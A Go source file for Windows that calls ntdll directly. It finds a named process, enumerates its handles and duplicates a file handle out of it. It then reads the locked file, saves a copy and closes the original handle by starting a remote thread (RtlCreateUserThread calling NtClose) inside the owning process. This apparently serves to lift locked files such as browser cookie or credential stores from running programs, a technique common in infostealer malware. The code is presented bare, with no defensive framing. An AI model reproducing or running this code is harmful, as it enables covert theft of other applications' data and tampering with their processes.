package main

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

const (
	fileReadData   = 0x0001
	fileWriteData  = 0x0002
	fileAppendData = 0x0004
	fileReadEA     = 0x0008
	fileWriteEA    = 0x0010
	fileReadAttr   = 0x0080
	fileWriteAttr  = 0x0100
	readControl    = 0x20000
	synchronize    = 0x100000
	processVmOp    = 0x0008
	processVmRead  = 0x0010
	processVmWrite = 0x0020

	statusMismatch = 0xC0000004
	statusSuccess  = 0x00000000
	statusNoMore   = 0x8000001A
	queryInfo      = 0x0400
	dupHandle      = 0x0040
	handleClass    = 51
	typeClass      = 2
	dosPath        = 0
	diskType       = 1
	createAlways   = 2
	normalAttr     = 0x80

	fileStandardInfo = 5
	filePositionInfo = 14
	fileNameInfo     = 9

	maxPath         = 32768
	fileOpenIf      = 3
	fileSyncIoAlert = 0x00000010
)

type Handle struct {
	Val    syscall.Handle
	Refs   uintptr
	Ptrs   uintptr
	Rights uint32
	Type   uint32
	Flags  uint32
	_      uint32
}

type Snapshot struct {
	Total uintptr
	_     uintptr
}

type ObjType struct {
	Name  WideStr
	Count uint32
	Total uint32
}

type WideStr struct {
	Size  uint16
	MaxSz uint16
	Data  *uint16
}

type SystemProcessInfo struct {
	NextEntryOffset uint32
	NumberOfThreads uint32
	Reserved1       [48]byte
	ImageName       WideStr
	BasePriority    int32
	UniqueProcessId uintptr
	Reserved2       uintptr
	HandleCount     uint32
	SessionId       uint32
	Reserved3       uintptr
	PeakVirtualSize uintptr
	VirtualSize     uintptr
	Reserved4       uint32
	PeakWorkingSet  uintptr
	WorkingSet      uintptr
	Reserved5       uintptr
	QuotaPagedPool  uintptr
	Reserved6       uintptr
	QuotaNonPaged   uintptr
	PagefileUsage   uintptr
	PeakPagefile    uintptr
	PrivateUsage    uintptr
	Reserved7       [6]uintptr
}

type IoStatusBlock struct {
	Status uintptr
	Info   uintptr
}

type FileStandardInfo struct {
	AllocationSize int64
	EndOfFile      int64
	NumberOfLinks  uint32
	DeletePending  byte
	Directory      byte
}

type FilePositionInfo struct {
	CurrentByteOffset int64
}

type FileNameInfo struct {
	FileNameLength uint32
	FileName       [1]uint16
}

type ObjectAttributes struct {
	Length                   uint32
	RootDirectory            syscall.Handle
	ObjectName               *WideStr
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type winAPI struct {
	queryProcess    *syscall.LazyProc
	querySystem     *syscall.LazyProc
	queryObject     *syscall.LazyProc
	closeHandle     *syscall.LazyProc
	readFile        *syscall.LazyProc
	queryFileInfo   *syscall.LazyProc
	setFileInfo     *syscall.LazyProc
	duplicateObject *syscall.LazyProc
	openProcess     *syscall.LazyProc
	createFile      *syscall.LazyProc
	writeFile       *syscall.LazyProc
	createThread    *syscall.LazyProc
}

var api = &winAPI{
	queryProcess:    syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryInformationProcess"),
	querySystem:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtQuerySystemInformation"),
	queryObject:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryObject"),
	closeHandle:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtClose"),
	readFile:        syscall.NewLazyDLL("ntdll.dll").NewProc("NtReadFile"),
	queryFileInfo:   syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryInformationFile"),
	setFileInfo:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtSetInformationFile"),
	duplicateObject: syscall.NewLazyDLL("ntdll.dll").NewProc("NtDuplicateObject"),
	openProcess:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenProcess"),
	createFile:      syscall.NewLazyDLL("ntdll.dll").NewProc("NtCreateFile"),
	writeFile:       syscall.NewLazyDLL("ntdll.dll").NewProc("NtWriteFile"),
	createThread:    syscall.NewLazyDLL("ntdll.dll").NewProc("RtlCreateUserThread"),
}

func ScanProcesses(target string) (map[uint32][]Handle, error) {
	procs := make(map[uint32][]Handle)

	var bufLen uint32 = 1024 * 1024
	var mem []byte
	code := uint32(statusMismatch)

	for code == statusMismatch {
		mem = make([]byte, bufLen)
		r, _, _ := api.querySystem.Call(5, uintptr(unsafe.Pointer(&mem[0])), uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
		code = uint32(r)
	}

	if code != statusSuccess {
		return nil, fmt.Errorf("query system failed: %x", code)
	}

	offset := uint32(0)
	for {
		if offset >= uint32(len(mem)) {
			break
		}

		info := (*SystemProcessInfo)(unsafe.Pointer(&mem[offset]))

		if info.UniqueProcessId != 0 && info.ImageName.Data != nil {
			sz := int(info.ImageName.Size / 2)
			if sz > 0 && sz < 512 {
				buf := (*[512]uint16)(unsafe.Pointer(info.ImageName.Data))[:sz:sz]
				name := syscall.UTF16ToString(buf)

				if strings.EqualFold(name, target) {
					pid := uint32(info.UniqueProcessId)

					var clientId struct {
						pid uintptr
						tid uintptr
					}
					clientId.pid = uintptr(pid)

					var objAttr ObjectAttributes
					objAttr.Length = uint32(unsafe.Sizeof(objAttr))

					var proc syscall.Handle
					if r, _, _ := api.openProcess.Call(
						uintptr(unsafe.Pointer(&proc)),
						uintptr(queryInfo|dupHandle),
						uintptr(unsafe.Pointer(&objAttr)),
						uintptr(unsafe.Pointer(&clientId)),
					); r == statusSuccess {

						var hBufLen uint32
						var hMem []byte
						hCode := uint32(statusMismatch)

						for hCode == statusMismatch {
							var p uintptr
							if hBufLen > 0 {
								hMem = make([]byte, hBufLen)
								p = uintptr(unsafe.Pointer(&hMem[0]))
							}

							r, _, _ := api.queryProcess.Call(uintptr(proc), handleClass, p, uintptr(hBufLen), uintptr(unsafe.Pointer(&hBufLen)))
							hCode = uint32(r)
						}

						if hCode == statusSuccess && hBufLen >= uint32(unsafe.Sizeof(Snapshot{})) {
							snap := (*Snapshot)(unsafe.Pointer(&hMem[0]))
							n := snap.Total

							if n > 0 && hBufLen >= uint32(unsafe.Sizeof(Snapshot{})+uintptr(n)*unsafe.Sizeof(Handle{})) {
								off := unsafe.Sizeof(Snapshot{})
								items := make([]Handle, n)
								for i := uintptr(0); i < n; i++ {
									src := (*Handle)(unsafe.Pointer(uintptr(unsafe.Pointer(&hMem[0])) + off + i*unsafe.Sizeof(Handle{})))
									items[i] = *src
								}
								procs[pid] = items
							}
						}

						api.closeHandle.Call(uintptr(proc))
					}
				}
			}
		}

		if info.NextEntryOffset == 0 {
			break
		}
		offset += info.NextEntryOffset
	}

	return procs, nil
}

func ExtractFile(hnd syscall.Handle, owner uint32, pattern string) ([]byte, string, error) {
	var clientId struct {
		pid uintptr
		tid uintptr
	}
	clientId.pid = uintptr(owner)

	var objAttr ObjectAttributes
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))

	var proc syscall.Handle
	if r, _, _ := api.openProcess.Call(
		uintptr(unsafe.Pointer(&proc)),
		uintptr(dupHandle),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&clientId)),
	); r != statusSuccess {
		return nil, "", fmt.Errorf("access denied")
	}
	defer api.closeHandle.Call(uintptr(proc))

	var dup syscall.Handle
	self := ^uintptr(0)

	accessRights := fileReadData | fileWriteData | fileAppendData | fileReadEA | fileWriteEA | fileReadAttr | fileWriteAttr | readControl | synchronize
	if r, _, _ := api.duplicateObject.Call(uintptr(proc), uintptr(hnd), self, uintptr(unsafe.Pointer(&dup)), uintptr(accessRights), 0, 0); r != statusSuccess {
		return nil, "", fmt.Errorf("dup error: %x", r)
	}
	defer api.closeHandle.Call(uintptr(dup))

	var bufLen uint32
	var mem []byte
	code := uint32(statusMismatch)

	for code == statusMismatch {
		var p uintptr
		if bufLen > 0 {
			mem = make([]byte, bufLen)
			p = uintptr(unsafe.Pointer(&mem[0]))
		}

		r, _, _ := api.queryObject.Call(uintptr(dup), typeClass, p, uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
		code = uint32(r)
	}

	if code != statusSuccess {
		return nil, "", fmt.Errorf("query failed: %x", code)
	}

	obj := (*ObjType)(unsafe.Pointer(&mem[0]))
	if obj.Name.Data == nil {
		return nil, "", fmt.Errorf("no name")
	}

	sz := int(obj.Name.Size / 2)
	if sz > 256 {
		sz = 256
	}
	buf := (*[256]uint16)(unsafe.Pointer(obj.Name.Data))[:sz:sz]
	kind := syscall.UTF16ToString(buf)

	if kind != "File" {
		return nil, "", fmt.Errorf("wrong type: %s", kind)
	}

	var nameLen uint32 = 4096
	nameBuf := make([]byte, nameLen)
	var iosb IoStatusBlock

	r, _, _ := api.queryFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(nameLen), fileNameInfo)
	if r != statusSuccess {
		return nil, "", fmt.Errorf("path error: %x", r)
	}

	nameInfo := (*FileNameInfo)(unsafe.Pointer(&nameBuf[0]))
	nameChars := int(nameInfo.FileNameLength / 2)
	if nameChars > 0 {
		namePtr := unsafe.Pointer(&nameInfo.FileName[0])
		nameBuf16 := (*[32768]uint16)(namePtr)[:nameChars:nameChars]
		fullpath := syscall.UTF16ToString(nameBuf16)

		sep := strings.LastIndex(fullpath, "\\")
		if sep == -1 {
			sep = strings.LastIndex(fullpath, "/")
		}

		var basename string
		if sep == -1 {
			basename = fullpath
		} else {
			basename = fullpath[sep+1:]
		}

		if !strings.EqualFold(basename, pattern) {
			return nil, "", fmt.Errorf("no match: got %s, want %s", basename, pattern)
		}

		var stdInfo FileStandardInfo
		iosb = IoStatusBlock{}

		if r, _, _ := api.queryFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&stdInfo)), unsafe.Sizeof(stdInfo), fileStandardInfo); r != statusSuccess {
			return nil, fullpath, fmt.Errorf("size error: %x", r)
		}

		fsz := stdInfo.EndOfFile
		if fsz == 0 {
			return []byte{}, fullpath, nil
		}

		var posInfo FilePositionInfo
		posInfo.CurrentByteOffset = 0
		api.setFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&posInfo)), unsafe.Sizeof(posInfo), filePositionInfo)

		content := make([]byte, fsz)
		iosb = IoStatusBlock{}

		if r, _, _ := api.readFile.Call(uintptr(dup), 0, 0, 0, uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&content[0])), uintptr(fsz), 0, 0); r != statusSuccess {
			return nil, fullpath, fmt.Errorf("read error: %x", r)
		}

		return content[:iosb.Info], fullpath, nil
	}

	return nil, "", fmt.Errorf("no filename")
}

func SaveFile(content []byte, dest string) error {
	var abspath string
	if len(dest) >= 2 && dest[1] == ':' {
		abspath = dest
	} else {
		rtlGetCurDir := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlGetCurrentDirectory_U")
		cwd := make([]uint16, 260)
		n, _, _ := rtlGetCurDir.Call(uintptr(len(cwd)*2), uintptr(unsafe.Pointer(&cwd[0])))
		if n == 0 {
			return fmt.Errorf("failed to get current directory")
		}
		cwdStr := syscall.UTF16ToString(cwd)
		abspath = cwdStr + "\\" + dest
	}

	abspath = "\\??\\" + abspath

	path16, err := syscall.UTF16FromString(abspath)
	if err != nil {
		return err
	}

	var ustr WideStr
	ustr.Size = uint16((len(path16) - 1) * 2)
	ustr.MaxSz = ustr.Size + 2
	ustr.Data = &path16[0]

	var objAttr ObjectAttributes
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
	objAttr.ObjectName = &ustr
	objAttr.Attributes = 0x40

	var iosb IoStatusBlock
	var h syscall.Handle

	r, _, _ := api.createFile.Call(
		uintptr(unsafe.Pointer(&h)),
		uintptr(fileWriteData|fileAppendData|synchronize),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&iosb)),
		0,
		normalAttr,
		0,
		5,
		0x00000020,
		0,
		0,
	)

	if r != statusSuccess {
		return fmt.Errorf("failed to create file: %x", r)
	}
	defer api.closeHandle.Call(uintptr(h))

	iosb = IoStatusBlock{}

	r, _, _ = api.writeFile.Call(
		uintptr(h),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&iosb)),
		uintptr(unsafe.Pointer(&content[0])),
		uintptr(len(content)),
		0,
		0,
	)

	if r != statusSuccess {
		return fmt.Errorf("failed to write file: %x", r)
	}

	return nil
}

func KillHandle(owner uint32, hnd syscall.Handle) error {
	var clientId struct {
		pid uintptr
		tid uintptr
	}
	clientId.pid = uintptr(owner)

	var objAttr ObjectAttributes
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))

	var proc syscall.Handle
	processCreateThread := uint32(0x0002)
	if r, _, _ := api.openProcess.Call(
		uintptr(unsafe.Pointer(&proc)),
		uintptr(dupHandle|processVmOp|processVmRead|processVmWrite|processCreateThread),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&clientId)),
	); r != statusSuccess {
		return fmt.Errorf("failed to open process: %x", r)
	}
	defer api.closeHandle.Call(uintptr(proc))

	fn := api.closeHandle.Addr()
	var thd syscall.Handle

	r, _, _ := api.createThread.Call(
		uintptr(proc),
		0,
		0,
		0,
		0,
		0,
		fn,
		uintptr(hnd),
		uintptr(unsafe.Pointer(&thd)),
		0,
	)

	if r != statusSuccess {
		return fmt.Errorf("failed to create remote thread: %x", r)
	}

	api.closeHandle.Call(uintptr(thd))
	return nil
}
